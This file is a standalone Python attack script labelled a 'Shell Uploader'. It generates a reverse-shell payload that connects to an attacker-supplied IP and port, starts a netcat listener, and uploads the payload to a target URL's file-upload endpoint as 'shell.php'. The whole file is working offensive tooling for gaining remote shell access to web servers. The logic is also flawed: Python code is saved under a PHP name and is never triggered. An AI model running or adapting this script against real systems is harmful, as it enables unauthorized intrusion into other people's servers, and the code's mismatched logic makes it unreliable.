import requests
import subprocess
import threading
import argparse

def generate_payload(ip, port):
    payload = f"""
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
"""
    return payload

def start_listener(ip, port):
    listener = subprocess.Popen(['nc', '-lvnp', f'{port}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return listener

def upload_shell(url, payload, upload_path):
    files = {'file': ('shell.php', payload)}
    response = requests.post(url, files=files)
    if response.status_code == 200:
        print(f"Shell uploaded successfully to {upload_path}")
    else:
        print(f"Failed to upload shell: {response.status_code}")

def main():
    parser = argparse.ArgumentParser(description="Shell Uploader Script")
    parser.add_argument("--url", required=True, help="Target URL for file upload")
    parser.add_argument("--ip", required=True, help="Local IP address for reverse shell")
    parser.add_argument("--port", required=True, help="Local port for reverse shell")
    parser.add_argument("--path", required=True, help="Upload path on the target server")
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    url = args.url
    upload_path = args.path

    payload = generate_payload(ip, port)
    listener_thread = threading.Thread(target=start_listener, args=(ip, port))
    listener_thread.start()

    upload_shell(url, payload, upload_path)

    print(f"Listening for incoming connections on {ip}:{port}...")
    listener_thread.join()

if __name__ == "__main__":
    main()